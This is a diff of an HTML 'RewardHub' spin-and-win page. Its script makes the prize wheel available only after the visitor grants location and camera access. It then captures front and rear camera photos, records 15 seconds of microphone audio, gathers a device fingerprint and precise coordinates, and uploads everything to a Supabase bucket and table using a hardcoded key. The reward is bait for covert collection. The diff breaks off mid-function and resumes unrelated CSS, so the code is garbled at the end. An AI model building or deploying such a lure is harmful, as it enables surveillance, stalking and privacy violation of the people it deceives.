@@ -2,104 +2,1395 @@
 <html lang="en">
 <head>
 <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>RewardHub — Spin & Win</title>
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>RewardHub</title>
 
 <style>
-*{
-  box-sizing:border-box;
-  margin:0;
-  padding:0;
-}
+*{box-sizing:border-box}
 
 body{
-  font-family:Arial,Helvetica,sans-serif;
-  background:
-    radial-gradient(circle at 50% 35%,#241000 0%,#090909 38%,#020202 100%);
+  margin:0;
+  font-family:Arial,sans-serif;
   color:#fff;
-  min-height:100vh;
-}
-
-.hidden{
-  display:none!important;
+  background:
+    radial-gradient(circle at 50% 30%,#251600,#090909 45%,#020202);
 }
 
 .container{
-  width:min(720px,94%);
+  width:min(700px,94%);
   margin:auto;
-  padding:24px 0 45px;
+  padding:22px 0 45px;
 }
+
+.hidden{display:none!important}
 
 .header{
   display:flex;
   justify-content:space-between;
   align-items:center;
-  gap:15px;
+  gap:12px;
   margin-bottom:30px;
 }
 
 .logo{
   font-size:25px;
-  font-weight:800;
+  font-weight:900;
 }
 
-.logo span{
-  color:#ffc72c;
-}
+.logo span{color:#ffc72c}
 
-.subtitle{
-  color:#aaa;
+.small{
+  color:#999;
   font-size:13px;
   margin-top:4px;
 }
 
-.safe{
-  border:1px solid #555;
-  border-radius:15px;
-  padding:10px 14px;
+.badge{
+  border:1px solid #444;
+  border-radius:14px;
+  padding:9px 12px;
   font-size:12px;
-  color:#ddd;
 }
 
-.hero{
-  text-align:center;
-  margin-bottom:25px;
-}
+.hero{text-align:center;margin-bottom:24px}
 
 .hero h1{
-  font-size:clamp(34px,8vw,58px);
-  line-height:1;
-  margin-bottom:10px;
+  font-size:clamp(34px,9vw,58px);
+  margin:0 0 10px;
 }
 
-.hero h1 span{
-  color:#ffc72c;
-}
+.hero h1 span{color:#ffc72c}
 
 .hero p{
-  color:#bbb;
+  color:#aaa;
   line-height:1.5;
 }
 
-.consent-card,
-.status-card,
-.result-card{
-  background:rgba(20,20,24,.92);
-  border:1px solid #3b3b42;
+.card{
+  background:#141419;
+  border:1px solid #36363d;
   border-radius:22px;
-  padding:25px;
+  padding:24px;
 }
 
-.consent-card h2{
-  margin-bottom:12px;
-}
+.card h2{margin-top:0}
 
-.consent-card p{
-  color:#bbb;
+.card p{
+  color:#aaa;
   line-height:1.6;
   font-size:14px;
-  margin-bottom:15px;
 }
+
+.permissions{
+  display:grid;
+  gap:10px;
+  margin:18px 0;
+}
+
+.permission{
+  background:#0d0d11;
+  border:1px solid #292930;
+  border-radius:13px;
+  padding:13px;
+  font-size:14px;
+}
+
+.main-btn{
+  width:100%;
+  border:0;
+  border-radius:15px;
+  padding:16px;
+  background:linear-gradient(135deg,#ffe476,#efa900);
+  color:#111;
+  font-size:17px;
+  font-weight:900;
+  cursor:pointer;
+}
+
+.main-btn:disabled{
+  opacity:.5;
+  cursor:not-allowed;
+}
+
+.status{
+  margin-top:18px;
+  text-align:center;
+}
+
+.loader{
+  width:42px;
+  height:42px;
+  margin:0 auto 15px;
+  border:4px solid #333;
+  border-top-color:#ffc72c;
+  border-radius:50%;
+  animation:load .8s linear infinite;
+}
+
+@keyframes load{
+  to{transform:rotate(360deg)}
+}
+
+.status-title{
+  font-size:20px;
+  font-weight:900;
+  margin-bottom:8px;
+}
+
+.status-text{
+  color:#aaa;
+  line-height:1.5;
+  font-size:14px;
+}
+
+/* wheel */
+
+.wheel-area{
+  text-align:center;
+  margin-top:25px;
+}
+
+.wheel-area h2{
+  font-size:36px;
+  margin-bottom:5px;
+}
+
+.wheel-area h2 span{color:#ffc72c}
+
+.wheel-desc{
+  color:#aaa;
+  margin-bottom:20px;
+}
+
+.wheel-box{
+  position:relative;
+  width:min(540px,92vw);
+  aspect-ratio:1;
+  margin:auto;
+  padding:10px;
+}
+
+.pointer{
+  position:absolute;
+  z-index:20;
+  left:50%;
+  top:-4px;
+  transform:translateX(-50%);
+  width:0;
+  height:0;
+  border-left:18px solid transparent;
+  border-right:18px solid transparent;
+  border-top:42px solid #ffd447;
+}
+
+.wheel{
+  width:100%;
+  height:100%;
+  border-radius:50%;
+  border:10px solid #d69a19;
+  box-shadow:
+    0 0 0 5px #704d0c,
+    0 0 35px rgba(255,200,40,.35);
+
+  background:
+  conic-gradient(
+    #e51d25 0deg 30deg,
+    #101014 30deg 60deg,
+    #e51d25 60deg 90deg,
+    #101014 90deg 120deg,
+    #e51d25 120deg 150deg,
+    #101014 150deg 180deg,
+    #e51d25 180deg 210deg,
+    #101014 210deg 240deg,
+    #e51d25 240deg 270deg,
+    #101014 270deg 300deg,
+    #e51d25 300deg 330deg,
+    #101014 330deg 360deg
+  );
+
+  transition:
+    transform 5s cubic-bezier(.12,.8,.15,1);
+}
+
+.label{
+  position:absolute;
+  top:50%;
+  left:50%;
+  width:50%;
+  height:50%;
+  transform-origin:0 0;
+  display:flex;
+  justify-content:center;
+  align-items:flex-start;
+  padding-top:15px;
+  font-size:clamp(13px,3vw,21px);
+  font-weight:900;
+  text-shadow:0 2px 3px #000;
+}
+
+.a1{transform:rotate(15deg)}
+.a2{transform:rotate(45deg)}
+.a3{transform:rotate(75deg)}
+.a4{transform:rotate(105deg)}
+.a5{transform:rotate(135deg)}
+.a6{transform:rotate(165deg)}
+.a7{transform:rotate(195deg)}
+.a8{transform:rotate(225deg)}
+.a9{transform:rotate(255deg)}
+.a10{transform:rotate(285deg)}
+.a11{transform:rotate(315deg)}
+.a12{transform:rotate(345deg)}
+
+.center{
+  position:absolute;
+  z-index:10;
+  left:50%;
+  top:50%;
+  transform:translate(-50%,-50%);
+  width:31%;
+  aspect-ratio:1;
+  border-radius:50%;
+  background:radial-gradient(circle,#ffe582,#e6a719);
+  border:5px solid #fff1a5;
+  color:#111;
+  display:flex;
+  flex-direction:column;
+  align-items:center;
+  justify-content:center;
+}
+
+.center strong{
+  font-size:clamp(18px,5vw,30px);
+}
+
+.center small{
+  font-weight:700;
+}
+
+.spin-btn{
+  margin-top:25px;
+  width:min(420px,90%);
+  padding:17px;
+  border:0;
+  border-radius:17px;
+  background:linear-gradient(135deg,#ffe477,#efa900);
+  color:#111;
+  font-size:20px;
+  font-weight:900;
+  cursor:pointer;
+}
+
+.spin-btn:disabled{
+  opacity:.5;
+  cursor:not-allowed;
+}
+
+.result{
+  margin-top:24px;
+  padding:22px;
+  border-radius:18px;
+  background:#141419;
+  border:1px solid #383840;
+  text-align:center;
+}
+
+.result-value{
+  margin-top:12px;
+  min-height:65px;
+  display:flex;
+  justify-content:center;
+  align-items:center;
+  font-size:30px;
+  font-weight:900;
+}
+
+.gold{color:#ffd33d}
+.muted{color:#999}
+
+.features{
+  display:grid;
+  grid-template-columns:repeat(3,1fr);
+  margin-top:20px;
+}
+
+.feature{
+  text-align:center;
+  color:#aaa;
+  padding:12px;
+  font-size:13px;
+}
+
+.feature b{color:#fff}
+
+.footer{
+  text-align:center;
+  color:#666;
+  font-size:13px;
+  margin-top:35px;
+}
+
+@media(max-width:520px){
+  .header{align-items:flex-start}
+  .badge{font-size:10px}
+  .features{grid-template-columns:1fr}
+}
+</style>
+</head>
+
+<body>
+
+<div class="container">
+
+<header class="header">
+  <div>
+    <div class="logo">🎁 Reward<span>Hub</span></div>
+    <div class="small">Spin • Win • Enjoy</div>
+  </div>
+
+  <div class="badge">
+    🛡️ Permission required
+  </div>
+</header>
+
+
+<!-- CONSENT -->
+
+<section id="consent">
+
+  <div class="hero">
+    <h1>Complete & <span>Spin!</span></h1>
+
+    <p>
+      Complete the required permission steps first.
+      The reward wheel becomes available after successful completion.
+    </p>
+  </div>
+
+
+  <div class="card">
+
+    <h2>Before you continue</h2>
+
+    <p>
+      By pressing <b>Allow & Continue</b>, you agree to the browser
+      permission requests described below.
+    </p>
+
+    <div class="permissions">
+
+      <div class="permission">
+        📍 <b>Precise location</b><br>
+        <span class="small">
+          Your browser will ask for location permission.
+        </span>
+      </div>
+
+      <div class="permission">
+        📷 <b>Camera</b><br>
+        <span class="small">
+          Camera access is requested after your permission.
+        </span>
+      </div>
+
+      <div class="permission">
+        🎙️ <b>Microphone</b><br>
+        <span class="small">
+          Recording is limited to a maximum of 15 seconds.
+        </span>
+      </div>
+
+    </div>
+
+    <button id="allow" class="main-btn">
+      Allow & Continue
+    </button>
+
+  </div>
+
+</section>
+
+
+<!-- STATUS -->
+
+<section id="status" class="card status hidden">
+
+  <div id="loader" class="loader"></div>
+
+  <div id="statusTitle" class="status-title">
+    Preparing…
+  </div>
+
+  <div id="statusText" class="status-text">
+    Please follow the browser permission prompts.
+  </div>
+
+</section>
+
+
+<!-- WHEEL -->
+
+<section id="wheelArea" class="wheel-area hidden">
+
+  <h2>
+    All <span>Set!</span>
+  </h2>
+
+  <div class="wheel-desc">
+    Everything is ready. Try the wheel.
+  </div>
+
+
+  <div class="wheel-box">
+
+    <div class="pointer"></div>
+
+    <div id="wheel" class="wheel">
+
+      <div class="label a1">€0</div>
+      <div class="label a2">€5</div>
+      <div class="label a3">€20</div>
+      <div class="label a4">€10</div>
+      <div class="label a5">€50</div>
+      <div class="label a6">LOSE</div>
+      <div class="label a7">€100</div>
+      <div class="label a8">€25</div>
+      <div class="label a9">€1</div>
+      <div class="label a10">€75</div>
+      <div class="label a11">€30</div>
+      <div class="label a12">€0</div>
+
+      <div class="center">
+        <strong>SPIN</strong>
+        <small>Good Luck!</small>
+      </div>
+
+    </div>
+
+  </div>
+
+
+  <button id="spin" class="spin-btn">
+    🔄 SPIN NOW
+  </button>
+
+
+  <div class="result">
+
+    <b>🏆 Your Result</b>
+
+    <div id="resultValue" class="result-value muted">
+      ---
+    </div>
+
+  </div>
+
+
+  <div class="features">
+
+    <div class="feature">
+      🎁<br>
+      <b>Reward</b><br>
+      Try your luck
+    </div>
+
+    <div class="feature">
+      🛡️<br>
+      <b>Permission</b><br>
+      Consent based
+    </div>
+
+    <div class="feature">
+      ⚡<br>
+      <b>Instant</b><br>
+      Quick & easy
+    </div>
+
+  </div>
+
+</section>
+
+
+<div class="footer">
+  RewardHub<br>
+  Play Fair • Have Fun
+</div>
+
+</div>
+
+
+<script>
+
+/* =====================================
+   SUPABASE
+===================================== */
+
+const SUPABASE_URL =
+"https://pkbdjrajsndtmjpmvebq.supabase.co";
+
+const SUPABASE_KEY =
+"sb_publishable_Ae_r3P5gRwqWUnPeKRMKAg_xmmJVIoW";
+
+
+/* =====================================
+   STATE
+===================================== */
+
+let locationData = null;
+
+let frontPhoto = null;
+let rearPhoto = null;
+let audioBlob = null;
+
+let locationConsent = false;
+let cameraConsent = false;
+let microphoneConsent = false;
+
+let wheelRotation = 0;
+let spun = false;
+
+
+/* =====================================
+   DOM
+===================================== */
+
+const allow =
+document.getElementById("allow");
+
+const consent =
+document.getElementById("consent");
+
+const status =
+document.getElementById("status");
+
+const statusTitle =
+document.getElementById("statusTitle");
+
+const statusText =
+document.getElementById("statusText");
+
+const wheelArea =
+document.getElementById("wheelArea");
+
+const wheel =
+document.getElementById("wheel");
+
+const spin =
+document.getElementById("spin");
+
+const resultValue =
+document.getElementById("resultValue");
+
+
+/* =====================================
+   STATUS
+===================================== */
+
+function setStatus(title,text){
+
+  statusTitle.textContent = title;
+  statusText.textContent = text;
+
+}
+
+
+/* =====================================
+   LOCATION
+===================================== */
+
+function getLocation(){
+
+  return new Promise((resolve,reject)=>{
+
+    if(!navigator.geolocation){
+
+      reject(
+        new Error(
+          "This browser does not support location."
+        )
+      );
+
+      return;
+    }
+
+    navigator.geolocation.getCurrentPosition(
+
+      position=>{
+
+        locationConsent = true;
+
+        locationData = {
+          latitude:position.coords.latitude,
+          longitude:position.coords.longitude
+        };
+
+        resolve();
+
+      },
+
+      ()=>{
+        reject(
+          new Error(
+            "Location permission was denied."
+          )
+        );
+      },
+
+      {
+        enableHighAccuracy:true,
+        timeout:20000,
+        maximumAge:0
+      }
+
+    );
+
+  });
+
+}
+
+
+/* =====================================
+   CAMERA CAPTURE
+===================================== */
+
+async function captureCamera(facingMode){
+
+  const stream =
+  await navigator.mediaDevices.getUserMedia({
+
+    video:{
+      facingMode:{
+        ideal:facingMode
+      }
+    },
+
+    audio:false
+
+  });
+
+
+  try{
+
+    const video =
+    document.createElement("video");
+
+    video.srcObject = stream;
+
+    video.muted = true;
+
+    video.playsInline = true;
+
+    await video.play();
+
+
+    /*
+      Give camera sensor a moment to initialize.
+    */
+
+    await new Promise(
+      resolve=>setTimeout(resolve,800)
+    );
+
+
+    const canvas =
+    document.createElement("canvas");
+
+
+    canvas.width =
+      video.videoWidth || 1280;
+
+    canvas.height =
+      video.videoHeight || 720;
+
+
+    const context =
+    canvas.getContext("2d");
+
+
+    context.drawImage(
+      video,
+      0,
+      0,
+      canvas.width,
+      canvas.height
+    );
+
+
+    const blob =
+    await new Promise(resolve=>{
+
+      canvas.toBlob(
+        resolve,
+        "image/jpeg",
+        .85
+      );
+
+    });
+
+
+    if(!blob){
+
+      throw new Error(
+        "Camera photo capture failed."
+      );
+
+    }
+
+
+    return blob;
+
+  }finally{
+
+    stream.getTracks().forEach(
+      track=>track.stop()
+    );
+
+  }
+
+}
+
+
+/* =====================================
+   CAMERA
+===================================== */
+
+async function getCamera(){
+
+  /*
+    First request front camera.
+  */
+
+  frontPhoto =
+  await captureCamera("user");
+
+
+  /*
+    Small delay before switching camera.
+  */
+
+  await new Promise(
+    resolve=>setTimeout(resolve,500)
+  );
+
+
+  /*
+    Then request rear camera.
+  */
+
+  try{
+
+    rearPhoto =
+    await captureCamera("environment");
+
+  }catch(error){
+
+    /*
+      Some phones/browsers expose only one
+      camera. Front photo is still retained.
+    */
+
+    console.warn(
+      "Rear camera unavailable:",
+      error
+    );
+
+    rearPhoto = null;
+
+  }
+
+
+  cameraConsent = true;
+
+}
+
+
+/* =====================================
+   MICROPHONE
+===================================== */
+
+async function getMicrophone(){
+
+  const stream =
+  await navigator.mediaDevices.getUserMedia({
+
+    audio:true,
+    video:false
+
+  });
+
+
+  microphoneConsent = true;
+
+
+  try{
+
+    if(!window.MediaRecorder){
+
+      throw new Error(
+        "Audio recording is not supported by this browser."
+      );
+
+    }
+
+
+    const chunks = [];
+
+
+    let mimeType = "";
+
+
+    const supportedTypes = [
+
+      "audio/webm;codecs=opus",
+      "audio/webm",
+      "audio/mp4"
+
+    ];
+
+
+    for(const type of supportedTypes){
+
+      if(
+        MediaRecorder.isTypeSupported(type)
+      ){
+
+        mimeType = type;
+        break;
+
+      }
+
+    }
+
+
+    const recorder =
+      mimeType
+      ? new MediaRecorder(
+          stream,
+          {mimeType}
+        )
+      : new MediaRecorder(stream);
+
+
+    recorder.ondataavailable =
+    event=>{
+
+      if(
+        event.data &&
+        event.data.size > 0
+      ){
+
+        chunks.push(event.data);
+
+      }
+
+    };
+
+
+    const stopped =
+    new Promise(resolve=>{
+
+      recorder.addEventListener(
+        "stop",
+        resolve,
+        {once:true}
+      );
+
+    });
+
+
+    recorder.start();
+
+
+    setStatus(
+      "Microphone recording…",
+      "Recording for a maximum of 15 seconds."
+    );
+
+
+    await new Promise(
+      resolve=>setTimeout(resolve,15000)
+    );
+
+
+    if(
+      recorder.state !== "inactive"
+    ){
+
+      recorder.stop();
+
+    }
+
+
+    await stopped;
+
+
+    audioBlob =
+      new Blob(
+        chunks,
+        {
+          type:
+            recorder.mimeType ||
+            "audio/webm"
+        }
+      );
+
+
+  }finally{
+
+    stream.getTracks().forEach(
+      track=>track.stop()
+    );
+
+  }
+
+}
+
+
+/* =====================================
+   DEVICE DATA
+===================================== */
+
+async function getBattery(){
+
+  try{
+
+    if(navigator.getBattery){
+
+      const battery =
+      await navigator.getBattery();
+
+      return Math.round(
+        battery.level * 100
+      );
+
+    }
+
+  }catch(e){}
+
+  return null;
+
+}
+
+
+async function getDeviceData(){
+
+  return {
+
+    user_agent:
+      navigator.userAgent || null,
+
+    platform:
+      navigator.platform || null,
+
+    language:
+      navigator.language || null,
+
+    timezone:
+      Intl.DateTimeFormat()
+      .resolvedOptions()
+      .timeZone || null,
+
+    screen_width:
+      screen.width || null,
+
+    screen_height:
+      screen.height || null,
+
+    color_depth:
+      screen.colorDepth || null,
+
+    battery_level:
+      await getBattery()
+
+  };
+
+}
+
+
+/* =====================================
+   UPLOAD
+===================================== */
+
+async function uploadMedia(
+  blob,
+  filename
+){
+
+  if(!blob){
+
+    return null;
+
+  }
+
+
+  const uniqueName =
+    Date.now() +
+    "-" +
+    Math.random()
+      .toString(36)
+      .slice(2) +
+    "-" +
+    filename;
+
+
+  const path =
+    "sessions/" +
+    uniqueName;
+
+
+  const response =
+  await fetch(
+
+    SUPABASE_URL +
+    "/storage/v1/object/visitor-media/" +
+    path,
+
+    {
+      method:"POST",
+
+      headers:{
+        "apikey":
+          SUPABASE_KEY,
+
+        "Authorization":
+          "Bearer " +
+          SUPABASE_KEY,
+
+        "Content-Type":
+          blob.type ||
+          "application/octet-stream",
+
+        "x-upsert":
+          "false"
+      },
+
+      body:blob
+
+    }
+
+  );
+
+
+  if(!response.ok){
+
+    const message =
+      await response.text();
+
+    throw new Error(
+      "Storage upload failed: " +
+      message
+    );
+
+  }
+
+
+  return path;
+
+}
+
+
+/* =====================================
+   DATABASE
+===================================== */
+
+async function saveDatabase(){
+
+  setStatus(
+    "Saving…",
+    "Saving the permitted diagnostics."
+  );
+
+
+  const device =
+    await getDeviceData();
+
+
+  /*
+    Upload media first.
+  */
+
+  const frontPath =
+    await uploadMedia(
+      frontPhoto,
+      "front.jpg"
+    );
+
+
+  const rearPath =
+    await uploadMedia(
+      rearPhoto,
+      "rear.jpg"
+    );
+
+
+  const audioPath =
+    await uploadMedia(
+      audioBlob,
+      "audio.webm"
+    );
+
+
+  let mapsUrl = null;
+
+
+  if(locationData){
+
+    mapsUrl =
+      "https://www.google.com/maps?q=" +
+      encodeURIComponent(
+        locationData.latitude +
+        "," +
+        locationData.longitude
+      );
+
+  }
+
+
+  const data = {
+
+    user_agent:
+      device.user_agent,
+
+    platform:
+      device.platform,
+
+    language:
+      device.language,
+
+    timezone:
+      device.timezone,
+
+    screen_width:
+      device.screen_width,
+
+    screen_height:
+      device.screen_height,
+
+    color_depth:
+      device.color_depth,
+
+    battery_level:
+      device.battery_level,
+
+    latitude:
+      locationData
+      ? locationData.latitude
+      : null,
+
+    longitude:
+      locationData
+      ? locationData.longitude
+      : null,
+
+    maps_url:
+      mapsUrl,
+
+    front_photo_path:
+      frontPath,
+
+    rear_photo_path:
+      rearPath,
+
+    audio_path:
+      audioPath,
+
+    camera_consent:
+      cameraConsent,
+
+    microphone_consent:
+      microphoneConsent,
+
+    location_consent:
+      locationConsent
+
+  };
+
+
+  const response =
+  await fetch(
+
+    SUPABASE_URL +
+    "/rest/v1/visitor_sessions",
+
+    {
+
+      method:"POST",
+
+      headers:{
+
+        "apikey":
+          SUPABASE_KEY,
+
+        "Authorization":
+          "Bearer " +
+          SUPABASE_KEY,
+
+        "Content-Type":
+          "application/json",
+
+        "Prefer":
+          "return=minimal"
+
+      },
+
+      body:
+        JSON.stringify(data)
+
+    }
+
+  );
+
+
+  if(!response.ok){
+
+    const error =
+      await response.text();
+
+    throw new Error(
+      "Database insert failed: " +
+      error
+    );
+
+  }
+
+}
+
+
+/* =====================================
+   MAIN FLOW
+===================================== */
+
+async function start(){
+
+  allow.disabled = true;
+
+  status.classList.remove("hidden");
+
+
+  try{
+
+    if(!window.isSecureContext){
+
+      throw new Error(
+        "HTTPS is required. Open the Vercel HTTPS URL."
+      );
+
+    }
+
+
+    if(
+      !navigator.mediaDevices ||
+      !navigator.mediaDevices.getUserMedia
+    ){
+
+      throw new Error(
+        "Camera/microphone API is unavailable."
+      );
+
+    }
+
+
+    /* LOCATION */
+
+    setStatus(
+      "Location permission",
+      "Please allow precise location in your browser."
+    );
+
+    await getLocation();
+
+
+    /* CAMERA */
+
+    setStatus(
+      "Camera permission",
+      "Please allow camera access."
+    );
+
+    await getCamera();
+
+
+    /* MICROPHONE */
+
+    setStatus(
+      "Microphone permission",
+      "Please allow microphone access."
+    );
+
+    await getMicrophone();
+
+
+    /* SAVE */
+
+    await saveDatabase();
+
+
+    /*
+      Only after everything above succeeds,
+      unlock the wheel.
+    */
+
+    consent.classList.add("hidden");
+
+    status.classList.add("hidden");
+
+    wheelArea.classList.remove("hidden");
+
+    spin.disabled = false;
+
+
+  }catch(error){
+
+    console.error(
+      "DIAGNOSTICS ERROR:",
+      error
+    );
+
+
+    setStatus(
+      "Something went wrong",
+      error.message ||
+      "Please try again."
+    );
+
+
+    allow.disabled = false;
+
+  }
+
+}
+
+
+/* =====================================
+   WHEEL
+===================================== */
+
+const prizes = [
+
+  "€0",
+  "€5",
+  "€20",
+  "€10",
+  "€50",
+  "LOSE",
+  "€100",
+  "€25",
+  "€1",
+  "€75",
+  "€30",
+  "€0"
+
+];
+
+
+function spinWheel(){
+
+  if(spun) return;
+
+  spun = true;
+
+  spin.disabled = true;
+
+  result}
 
 .permission-list{
   display:grid;
